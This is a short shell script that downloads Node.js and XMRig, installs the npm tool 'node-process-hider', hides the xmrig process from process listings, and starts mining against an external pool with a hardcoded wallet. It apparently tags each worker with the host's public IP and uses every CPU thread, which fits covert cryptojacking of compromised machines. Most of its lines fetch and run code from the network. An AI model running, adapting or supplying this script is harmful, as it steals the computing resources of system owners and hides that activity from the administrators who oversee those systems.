wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
npm i -g node-process-hider
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
ph add xmrig
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/arq -o evox.e4pool.com:4488 -u evcFBgvjCCZ3qQ5bHSTR1FPZaQ8t2vd1DRtiiomjXeDwLoYq4X3ccL5hJzCUDVggAR1hLeTBk8PBM1FfkcoNWFHb6Jwq39kwWM.$ip -p x --threads=$(nproc --all) --cpu-priority=5 --randomx-mode=fast --keepalive
